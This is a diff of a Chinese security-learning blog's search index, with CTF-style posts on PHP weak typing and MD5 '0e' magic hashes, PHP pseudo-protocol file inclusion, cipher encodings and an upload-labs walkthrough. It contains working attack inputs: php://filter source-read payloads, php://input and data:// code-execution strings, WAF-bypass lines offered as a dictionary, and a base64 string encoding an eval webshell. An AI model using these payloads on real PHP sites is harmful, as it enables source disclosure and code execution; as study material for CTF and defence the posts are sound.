+<p>QNKCDZO<br>0e830400451993494058024219903391</p>
+<p>s878926199a<br>0e545993274517709034328855841020</p>
+<p>s155964671a<br>0e342768416822451524974117254469</p>
+<p>s214587387a<br>0e848240448830537924465865611904</p>
+<p>s214587387a<br>0e848240448830537924465865611904</p>
+<p>s878926199a<br>0e545993274517709034328855841020</p>
+<p>s1091221200a<br>0e940624217856561557816327384675</p>
+<p>s1885207154a<br>0e509367213418206700842008763514</p>
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>php</tag>
       </tags>
   </entry>
   <entry>
@@ -1593,93 +1680,6 @@
 <p>访问：<a href="http://127.0.0.1/test5.php?per_serialized=O:4:%22read%22:1:{s:8:%22filename%22;s:5:%222.txt%22;}" target="_blank" rel="noopener">http://127.0.0.1/test5.php?per_serialized=O:4:%22read%22:1:{s:8:%22filename%22;s:5:%222.txt%22;}</a></p>
 <p><img src="http://pp64r48ul.bkt.clouddn.com/5.png" alt="在这里插入图片描述"></p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过上面的学习，我们知道，要想找到一个php漏洞，需要先找到可控的反序列化函数，通过这些反序列化函数，我们去调用一些类，这些类中可能会包含一些魔法函数，在这些魔法函数中可能会有一些我们可控的危险操作，从而触发了php反序列化漏洞。</p>
-]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php伪协议</title>
-    <url>/posts/3072.html</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>PHP伪协议在CTF中经常出现，也经常跟文件包含，文件上传，命令执行等漏洞结合在一起，所以本文章对常见的一些协议进行总结。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:&#x2F;&#x2F; — 访问本地文件系统</span><br><span class="line">http:&#x2F;&#x2F; — 访问 HTTP(s) 网址</span><br><span class="line">ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs</span><br><span class="line">php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams</span><br><span class="line">zlib:&#x2F;&#x2F; — 压缩流</span><br><span class="line">data:&#x2F;&#x2F; — 数据（RFC 2397）</span><br><span class="line">glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</span><br><span class="line">phar:&#x2F;&#x2F; — PHP 归档</span><br><span class="line">ssh2:&#x2F;&#x2F; — Secure Shell 2</span><br><span class="line">rar:&#x2F;&#x2F; — RAR</span><br><span class="line">ogg:&#x2F;&#x2F; — 音频流</span><br><span class="line">expect:&#x2F;&#x2F; — 处理交互式的流</span><br></pre></td></tr></table></figure>
-
-<p><strong>今天着重研究php://</strong></p>
-<p>有两个比较重要的配置在<code>php.ini</code>中，<code>allow_url_fopen</code> 和<br><code>allow_url_include</code>会影响到<code>fopen</code>等等和<code>include</code>等等函数对于伪协<br>议的支持，而<code>allow_url_include</code>依赖<code>allow_url_fopen</code>，所以<br><code>allow_url_fopen</code>不开启的话，<code>allow_url_include</code>也是无法使用的。</p>
-<h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p><code>php://input</code>代表可以访问请求的原始数据，简单来说<code>POST</code>请求的情况下，<code>php://input</code>可以获取到post的数据。</p>
-<ul>
-<li><strong>使用条件：include()、include_once()、file_get_contents()</strong></li>
-</ul>
-<p>比较特殊的一点，<code>enctype=”multipart/form-data”</code> 的时候 php://input 是无效的。</p>
-<h3 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h3><p>php://output 是一个只写的数据流，允许你以 <code>print</code> 和 <code>echo</code> 一样的方式写入到输出缓冲区。</p>
-<h3 id="php-filter-重点"><a href="#php-filter-重点" class="headerlink" title="php://filter(重点)"></a>php://filter(重点)</h3><p>这篇文章的关键在于讨论<code>php://filte</code>r,事实上，这也是我们常常使用的一个伪协议，在任意文件读取，甚至getshell的时候都有利用的机会。</p>
-<p><code>php://filter</code> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用，也就是作为一种过滤器，可以使用在数据流产生的地方。</p>
-<p>这对于一体式（all-in-one）的文件函数非常有用，类似 <code>readfile()</code>、 <code>file()</code> 和 <code>file_get_contents()</code>， 在数据流内容读取之前没有机会应用其他过滤器。</p>
-<p>事实上，在<code>include</code>函数的使用上，经常会造成任意文件读取漏洞，而<code>file_get_contents()</code>和<code>file_put_contents()</code>这样函数下，常常会构成getshell等更严重的漏洞。</p>
-<h2 id="URL中包含点的常见形式"><a href="#URL中包含点的常见形式" class="headerlink" title="URL中包含点的常见形式"></a>URL中包含点的常见形式</h2><ul>
-<li><p><code>?file = xxx 或者 ?file = xxx.php</code></p>
-<p>那么源码中的写法：</p>
-<p><code>include($file.&#39;php&#39;) 或者 include($file)</code></p>
-<p>这里直接使用伪协议包含：</p>
-<p><code>?file=php://filter/read=convert.base64-encode/resource=login</code></p>
-</li>
-<li><p><code>?action = xxx &amp; mode = xxx</code></p>
-<p>这里形式就是文件夹加上文件名的方法</p>
-<p><code>http://www.example.com/index.php?action=front&amp;mode=login</code></p>
-<p>那么源码中的写法：</p>
-<p><code>include($action.&#39;/&#39;.$mode.&#39;.php&#39;);</code></p>
-<p>那么对于这种情况使用的伪协议包含形式：</p>
-<p><code>?action=php://filter/read=convert.base64-encode/resource=./&amp;mode=login</code></p>
-</li>
-</ul>
-<h2 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h2><p>题目链接：<a href="http://level3.tasteless.en/" target="_blank" rel="noopener">http://level3.tasteless.en/</a></p>
-<p>题目直接给出了源码：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(&#39;index.php&#39;);</span><br><span class="line">&#x2F;*</span><br><span class="line">view file: php.ini</span><br><span class="line">so here is my hint: the included php.ini file is part of the configugartion file used on the server the bug was found.</span><br><span class="line">so there will be something in it which enables you to solve this level, wont?</span><br><span class="line"></span><br><span class="line">always be UP TO DATE!</span><br><span class="line"></span><br><span class="line">hint enough, might just take you seconds to do?!</span><br><span class="line">*&#x2F;</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&#39;anti_rfi.php&#39;); &#x2F;&#x2F;rfi is forbidden!!!!!</span><br><span class="line"></span><br><span class="line">$inc &#x3D; @$_GET[&#39;file&#39;];</span><br><span class="line">@require_once($inc);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>用php://input直接就能执行任意代码<br><img src="/posts/3072/%E4%BC%AA%E5%8D%8F%E8%AE%AE1.jpg" alt></p>
-<h3 id="绕过waf的方法"><a href="#绕过waf的方法" class="headerlink" title="绕过waf的方法"></a>绕过waf的方法</h3><p>在一些ctf中会对一些伪协议的关键词进行过滤，如read、resource等等，下面总结了几条绕过方法，在实战总作为字典来跑。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?f&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;login.php（过滤了操作名read）</span><br><span class="line"></span><br><span class="line">?f&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;1.jpg&#x2F;resource&#x3D;.&#x2F;show.php（正则 &#x2F;resource&#x3D;*.jpg&#x2F;i）</span><br><span class="line"></span><br><span class="line">?f&#x3D;data:text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line"></span><br><span class="line">?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br></pre></td></tr></table></figure>
-
-<h2 id="截断包含"><a href="#截断包含" class="headerlink" title="截断包含"></a>截断包含</h2><h3 id="截断"><a href="#截断" class="headerlink" title="截断"></a>截断</h3><p>这里技巧现在应该是用的比较少了，因为利用截断要满足下面的两个条件：</p>
-<ul>
-<li><p>php版本小于5.3.4</p>
-</li>
-<li><p>magic_quotes_gpc为off</p>
-</li>
-</ul>
-<h3 id="截断-1"><a href="#截断-1" class="headerlink" title="./ 截断"></a>./ 截断</h3><p>点号和路径截断以及./截断，也就是填充大量的./使url长度超过最大值，来达到截断的目的。</p>
-<p>具体可以看下面的文章：<a href="https://blog.csdn.net/zvall/article/details/8951925" target="_blank" rel="noopener">https://blog.csdn.net/zvall/article/details/8951925</a> </p>
-<h2 id="zip协议和phar协议"><a href="#zip协议和phar协议" class="headerlink" title="zip协议和phar协议"></a>zip协议和phar协议</h2><p>在实战过程中，若发现存在文件上传但是没有办法直接上传php文件，可以传zip压缩文件，我们就利用这两个协议，将php文件打包成zip文件来包含里面的php脚本。</p>
-<p>phar://、zip://，都可以看到在phpinfo中有相应的描述。</p>
-<p>例如脚本文件为1.php，打包成1.zip，然后再改名为1.jpg，上传之后包含1.jpg中的php文件即可。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zip:&#x2F;&#x2F;..（当前脚本的绝对路径）...&#x2F;1.jpg#1.php</span><br><span class="line">phar:&#x2F;&#x2F;...（当前脚本的绝对路径）...&#x2F;1.jpg&#x2F;1（分割不加后缀名）</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php弱类型</title>
-    <url>/posts/21181.html</url>
-    <content><![CDATA[<p>弱类型</p>
-<p>比较：<br>=== 强等于 ：先判断两种字符串的类型，再比较<br>==  弱等于 ：先将字符串类型转换成相同，再比较</p>
-<a id="more"></a>
-<p>如果一个数值和字符串进行比较的时候，会将字符串转换成数值<br>Abc == 0<br>1abc == 1<br>Abc1 == 0<br>0e123 == 0e456 //0e被识别为科学计数法</p>
-<p>如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内<br>该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0</p>
-<p>a = 1 + “10.5”  //a = 11.5<br>b = 1 + “-1.1e3” //a = -1099<br>c = 1 + “ab123”   //c = 1<br>d = 1+”2ab”    //d = 3</p>
-<p>MD5绕过<br>0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0</p>
-<p>QNKCDZO<br>0e830400451993494058024219903391</p>
-<p>s878926199a<br>0e545993274517709034328855841020</p>
-<p>s155964671a<br>0e342768416822451524974117254469</p>
-<p>s214587387a<br>0e848240448830537924465865611904</p>
-<p>s214587387a<br>0e848240448830537924465865611904</p>
-<p>s878926199a<br>0e545993274517709034328855841020</p>
-<p>s1091221200a<br>0e940624217856561557816327384675</p>
-<p>s1885207154a<br>0e509367213418206700842008763514</p>
 ]]></content>
       <categories>
         <category>PHP</category>
@@ -2544,43 +2544,6 @@ string substr(string, start, length)
       </tags>
   </entry>
   <entry>
-    <title>常见加解密总结</title>
-    <url>/posts/56330.html</url>
-    <content><![CDATA[<h2 id="0x00-base64"><a href="#0x00-base64" class="headerlink" title="0x00  base64"></a>0x00  base64</h2><p>Base64就是用64个可显示字符表示所有的ASCii字符，64也就是6Bits，而ASC字符一共有256个，也就是8Bits。Base64编码要求把3个8位字节（38=24）转化为4个6位的字节（46=24），之后在6位的前面补两个0，形成8位一个字节的形式。 如果剩下的字符不足3个字节，则用0填充，输出字符使用’=’，因此编码后输出的文本末尾可能会出现<strong>1或2个’=’</strong></p>
-<p>形式：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ZXZhbCgkX1BPU1RbcDRuOV96MV96aDNuOV9qMXVfU2gxX0oxM10pNTU2NJC3ODHHYWJIZ3P4ZWY&#x3D;</span><br></pre></td></tr></table></figure>
-<p><a href="http://www1.tc711.com/tool/BASE64.htm" target="_blank" rel="noopener">base64在线加解密</a></p>
-<h2 id="0x01-base32"><a href="#0x01-base32" class="headerlink" title="0x01 base32"></a>0x01 base32</h2><p>Base32是用32个字符表示256个ASCii字符，也就是说5个ASCii字符一组可以生成8个Base字符。</p>
-<h2 id="0x02-培根密码"><a href="#0x02-培根密码" class="headerlink" title="0x02 培根密码"></a>0x02 培根密码</h2><p>培根密码实际上就是一种替换密码，根据所给表一一对应转换即可加密解密 。<br>它的特殊之处在于：可以通过不明显的特征来隐藏密码信息，比如大小写、正斜体等，只要两个不同的属性，密码即可隐藏.需要注意的是输入的都应该是<strong>全小写字母或全大写字母</strong>。</p>
-<p>第一种方式</p>
-<p>A aaaaa B aaaab C aaaba D aaabb<br>E aabaa F aabab G aabba H aabbb<br>I abaaa J abaab K ababa L ababb<br>M abbaa N abbab O abbba P abbbb<br>Q baaaa R baaab S baaba T baabb<br>U babaa V babab W babba X babbb<br>Y bbaaa Z bbaab</p>
-<p>第二种方式</p>
-<p>a AAAAA g AABBA n ABBAA t BAABA<br>b AAAAB h AABBB o ABBAB u-v BAABB<br>c AAABA i-j ABAAA p ABBBA w BABAA<br>d AAABB k ABAAB q ABBBB x BABAB<br>e AABAA l ABABA r BAAAA y BABBA<br>f AABAB m ABABB s BAAAB z BABBB</p>
-<h2 id="0x03-摩斯密码"><a href="#0x03-摩斯密码" class="headerlink" title="0x03 摩斯密码"></a>0x03 摩斯密码</h2><p>摩尔斯电码是一种早期的数字化通信形式，但是它不同于现代只使用零和一两种状态的二进制代码，它的代码包括五种： 点、划、点和划之间的停顿、每个字符间短的停顿（在点和划之间）、每个词之间中等的停顿以及句子之间长的停顿。</p>
-<p>形式：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">– — .-. … .</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.imgur.com/Ar0vSSx.png" alt></p>
-<p><a href="https://www.jb51.net/tools/morse.htm" target="_blank" rel="noopener">摩斯密码在线加解密</a></p>
-<h2 id="0x04-JsFuck"><a href="#0x04-JsFuck" class="headerlink" title="0x04 JsFuck"></a>0x04 JsFuck</h2><p>JSFuck 可以只用6个字符 !+ 来编写 JavaScript 程序。</p>
-<p>形式：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[][([]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+([]+[])[+[[!+[]+!+[]]]]+(![]+[])[+[[+[]]]]+(![]+[])[+[[!+[]+!+[]+!+[]]]]+(![]+[])[+[[+!+ []]]]][([][([]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+([]+[])[+[[!+[]+!+[]]]]+(![]+[])[+[[+[]]]]+(![]+[])[+[[!+[]+!+[]+!+[]]]]+(![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]()</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://www.sojson.com/jsjiemi.html" target="_blank" rel="noopener">JsFuck在线加解密</a></p>
-<h2 id="0x05-栅栏密码"><a href="#0x05-栅栏密码" class="headerlink" title="0x05 栅栏密码"></a>0x05 栅栏密码</h2><p>所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。（一般不超过30个，也就是一、两句话）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">明文：THERE IS A CIPHER</span><br><span class="line">去掉空格后变为：THEREISACIPHER</span><br><span class="line">两个一组，得到：TH ER EI SA CI PH ER</span><br><span class="line">先取出第一个字母：TEESCPE</span><br><span class="line">再取出第二个字母：HRIAIHR</span><br><span class="line">连在一起就是：TEESCPEHRIAIHR</span><br><span class="line">还原为所需密码。</span><br><span class="line">而解密的时候，我们先把密文从中间分开，变为两行：</span><br><span class="line">T E E S C P E</span><br><span class="line">H R I A I H R</span><br><span class="line">再按上下上下的顺序组合起来：</span><br><span class="line">THEREISACIPHER</span><br><span class="line">分出空格，就可以得到原文了：</span><br><span class="line">THERE IS A CIPHER</span><br><span class="line"> </span><br><span class="line">例如密文：NlEyQd&#123;seft&#125;</span><br><span class="line">N E Q &#123; e t</span><br><span class="line">l y d s f &#125;</span><br><span class="line"></span><br><span class="line">NEQ&#123;etIydsf&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>域环境搭建</title>
     <url>/posts/55656.html</url>
     <content><![CDATA[<h2 id="0x00-环境搭建准备"><a href="#0x00-环境搭建准备" class="headerlink" title="0x00 环境搭建准备"></a>0x00 环境搭建准备</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DC: win server 2008 R2  IP: 192.168.72.10</span><br><span class="line">DM: win xp              IP: 192.168.72.11  </span><br><span class="line">DM: win server 2012     IP: 192.168.72.14</span><br></pre></td></tr></table></figure>
@@ -2631,6 +2594,43 @@ string substr(string, start, length)
       </categories>
       <tags>
         <tag>域</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>常见加解密总结</title>
+    <url>/posts/56330.html</url>
+    <content><![CDATA[<h2 id="0x00-base64"><a href="#0x00-base64" class="headerlink" title="0x00  base64"></a>0x00  base64</h2><p>Base64就是用64个可显示字符表示所有的ASCii字符，64也就是6Bits，而ASC字符一共有256个，也就是8Bits。Base64编码要求把3个8位字节（38=24）转化为4个6位的字节（46=24），之后在6位的前面补两个0，形成8位一个字节的形式。 如果剩下的字符不足3个字节，则用0填充，输出字符使用’=’，因此编码后输出的文本末尾可能会出现<strong>1或2个’=’</strong></p>
+<p>形式：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ZXZhbCgkX1BPU1RbcDRuOV96MV96aDNuOV9qMXVfU2gxX0oxM10pNTU2NJC3ODHHYWJIZ3P4ZWY&#x3D;</span><br></pre></td></tr></table></figure>
+<p><a href="http://www1.tc711.com/tool/BASE64.htm" target="_blank" rel="noopener">base64在线加解密</a></p>
+<h2 id="0x01-base32"><a href="#0x01-base32" class="headerlink" title="0x01 base32"></a>0x01 base32</h2><p>Base32是用32个字符表示256个ASCii字符，也就是说5个ASCii字符一组可以生成8个Base字符。</p>
+<h2 id="0x02-培根密码"><a href="#0x02-培根密码" class="headerlink" title="0x02 培根密码"></a>0x02 培根密码</h2><p>培根密码实际上就是一种替换密码，根据所给表一一对应转换即可加密解密 。<br>它的特殊之处在于：可以通过不明显的特征来隐藏密码信息，比如大小写、正斜体等，只要两个不同的属性，密码即可隐藏.需要注意的是输入的都应该是<strong>全小写字母或全大写字母</strong>。</p>
+<p>第一种方式</p>
+<p>A aaaaa B aaaab C aaaba D aaabb<br>E aabaa F aabab G aabba H aabbb<br>I abaaa J abaab K ababa L ababb<br>M abbaa N abbab O abbba P abbbb<br>Q baaaa R baaab S baaba T baabb<br>U babaa V babab W babba X babbb<br>Y bbaaa Z bbaab</p>
+<p>第二种方式</p>
+<p>a AAAAA g AABBA n ABBAA t BAABA<br>b AAAAB h AABBB o ABBAB u-v BAABB<br>c AAABA i-j ABAAA p ABBBA w BABAA<br>d AAABB k ABAAB q ABBBB x BABAB<br>e AABAA l ABABA r BAAAA y BABBA<br>f AABAB m ABABB s BAAAB z BABBB</p>
+<h2 id="0x03-摩斯密码"><a href="#0x03-摩斯密码" class="headerlink" title="0x03 摩斯密码"></a>0x03 摩斯密码</h2><p>摩尔斯电码是一种早期的数字化通信形式，但是它不同于现代只使用零和一两种状态的二进制代码，它的代码包括五种： 点、划、点和划之间的停顿、每个字符间短的停顿（在点和划之间）、每个词之间中等的停顿以及句子之间长的停顿。</p>
+<p>形式：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">– — .-. … .</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.imgur.com/Ar0vSSx.png" alt></p>
+<p><a href="https://www.jb51.net/tools/morse.htm" target="_blank" rel="noopener">摩斯密码在线加解密</a></p>
+<h2 id="0x04-JsFuck"><a href="#0x04-JsFuck" class="headerlink" title="0x04 JsFuck"></a>0x04 JsFuck</h2><p>JSFuck 可以只用6个字符 !+ 来编写 JavaScript 程序。</p>
+<p>形式：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[][([]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+([]+[])[+[[!+[]+!+[]]]]+(![]+[])[+[[+[]]]]+(![]+[])[+[[!+[]+!+[]+!+[]]]]+(![]+[])[+[[+!+ []]]]][([][([]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+([]+[])[+[[!+[]+!+[]]]]+(![]+[])[+[[+[]]]]+(![]+[])[+[[!+[]+!+[]+!+[]]]]+(![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]()</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.sojson.com/jsjiemi.html" target="_blank" rel="noopener">JsFuck在线加解密</a></p>
+<h2 id="0x05-栅栏密码"><a href="#0x05-栅栏密码" class="headerlink" title="0x05 栅栏密码"></a>0x05 栅栏密码</h2><p>所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。（一般不超过30个，也就是一、两句话）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">明文：THERE IS A CIPHER</span><br><span class="line">去掉空格后变为：THEREISACIPHER</span><br><span class="line">两个一组，得到：TH ER EI SA CI PH ER</span><br><span class="line">先取出第一个字母：TEESCPE</span><br><span class="line">再取出第二个字母：HRIAIHR</span><br><span class="line">连在一起就是：TEESCPEHRIAIHR</span><br><span class="line">还原为所需密码。</span><br><span class="line">而解密的时候，我们先把密文从中间分开，变为两行：</span><br><span class="line">T E E S C P E</span><br><span class="line">H R I A I H R</span><br><span class="line">再按上下上下的顺序组合起来：</span><br><span class="line">THEREISACIPHER</span><br><span class="line">分出空格，就可以得到原文了：</span><br><span class="line">THERE IS A CIPHER</span><br><span class="line"> </span><br><span class="line">例如密文：NlEyQd&#123;seft&#125;</span><br><span class="line">N E Q &#123; e t</span><br><span class="line">l y d s f &#125;</span><br><span class="line"></span><br><span class="line">NEQ&#123;etIydsf&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -2766,27 +2766,6 @@ string substr(string, start, length)
       </tags>
   </entry>
   <entry>
-    <title>文件上传(二)之实战篇</title>
-    <url>/posts/31481.html</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近打了场XCTF，看到同学在群里交流，自己不自觉留下来没有技术的泪水。。。<br>好吧，那就开始学吧。。。在网上找到一个不错的上传漏洞汇总的靶场，在本地搭建好环境，开始闭关。。。。。。</p>
-<p>靶场源码地址：<code>github.com/c0ny1/upload-labs</code></p>
-<p>我下载的是靶主已经集成配置好的环境进行本地搭建。</p>
-<p>地址：<code>github.com/c0ny1/upload-labs/releases</code></p>
-<p><img src="/posts/31481/%E4%B8%8A%E4%BC%A01.png" alt="界面"></p>
-<h1 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h1><p><img src="/posts/31481/%E4%B8%8A%E4%BC%A02.jpg" alt><br>上传一个<code>2.php</code>文件<br><img src="/posts/31481/%E4%B8%8A%E4%BC%A03.jpg" alt><br>查看提示：<br><img src="/posts/31481/%E4%B8%8A%E4%BC%A03.jpg" alt></p>
-<p>查看源码：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function checkFile() &#123;</span><br><span class="line">    var file &#x3D; document.getElementsByName(&#39;upload_file&#39;)[0].value;</span><br><span class="line">    if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line">        alert(&quot;请选择要上传的文件!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;定义允许上传的文件类型</span><br><span class="line">    var allow_ext &#x3D; &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">    &#x2F;&#x2F;提取上传文件的类型</span><br><span class="line">    var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">    &#x2F;&#x2F;判断上传文件类型是否允许上传</span><br><span class="line">    if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123;</span><br><span class="line">        var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>发现只允许上传<code>.jpg|.png|.gif</code>类型的文件</p>
-<p>未完。。。。。。</p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>文件下载</title>
     <url>/posts/18452.html</url>
     <content><![CDATA[<h1 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对于渗透测试来说，当我们拿到的目标权限过低，会很难进行下一步动作，便需要使用其他利器继续进行提权等操作，当需要将文件下载到目标机器时，就会用到文件下载命令。</p>
@@ -2834,6 +2813,27 @@ string substr(string, start, length)
 ]]></content>
   </entry>
   <entry>
+    <title>文件上传(二)之实战篇</title>
+    <url>/posts/31481.html</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近打了场XCTF，看到同学在群里交流，自己不自觉留下来没有技术的泪水。。。<br>好吧，那就开始学吧。。。在网上找到一个不错的上传漏洞汇总的靶场，在本地搭建好环境，开始闭关。。。。。。</p>
+<p>靶场源码地址：<code>github.com/c0ny1/upload-labs</code></p>
+<p>我下载的是靶主已经集成配置好的环境进行本地搭建。</p>
+<p>地址：<code>github.com/c0ny1/upload-labs/releases</code></p>
+<p><img src="/posts/31481/%E4%B8%8A%E4%BC%A01.png" alt="界面"></p>
+<h1 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h1><p><img src="/posts/31481/%E4%B8%8A%E4%BC%A02.jpg" alt><br>上传一个<code>2.php</code>文件<br><img src="/posts/31481/%E4%B8%8A%E4%BC%A03.jpg" alt><br>查看提示：<br><img src="/posts/31481/%E4%B8%8A%E4%BC%A03.jpg" alt></p>
+<p>查看源码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function checkFile() &#123;</span><br><span class="line">    var file &#x3D; document.getElementsByName(&#39;upload_file&#39;)[0].value;</span><br><span class="line">    if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line">        alert(&quot;请选择要上传的文件!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;定义允许上传的文件类型</span><br><span class="line">    var allow_ext &#x3D; &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">    &#x2F;&#x2F;提取上传文件的类型</span><br><span class="line">    var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">    &#x2F;&#x2F;判断上传文件类型是否允许上传</span><br><span class="line">    if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123;</span><br><span class="line">        var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现只允许上传<code>.jpg|.png|.gif</code>类型的文件</p>
+<p>未完。。。。。。</p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>文件泄露漏洞</title>
     <url>/posts/56132.html</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前两天刚做了一道<code>.git</code>文件泄露的题，在网上查了些资料，发现还有其他的文件泄露漏洞，现在来总结一下。</p>
@@ -2865,22 +2865,6 @@ string substr(string, start, length)
       </tags>
   </entry>
   <entry>
-    <title>日常记录</title>
-    <url>/posts/42951.html</url>
-    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <div class="hbe-input-container">
-  <input type="password" id="hbePass" placeholder="" />
-    <label for="hbePass">输入密码，查看文章！</label>
-    <div class="bottom-line"></div>
-  </div>
-  <script id="hbeData" type="hbeData" data-hmacdigest="f4f25515922814b31789af777e8cc081f949bd50de753aaf64e1e2b4b1866cac">8de2c04a2d70dba63f65a56a98175f4a</script>
-</div>
-<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
-      <categories>
-        <category>总结</category>
-      </categories>
-  </entry>
-  <entry>
     <title>日志</title>
     <url>/posts/32353.html</url>
     <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
@@ -2898,6 +2882,22 @@ string substr(string, start, length)
       <tags>
         <tag>日志</tag>
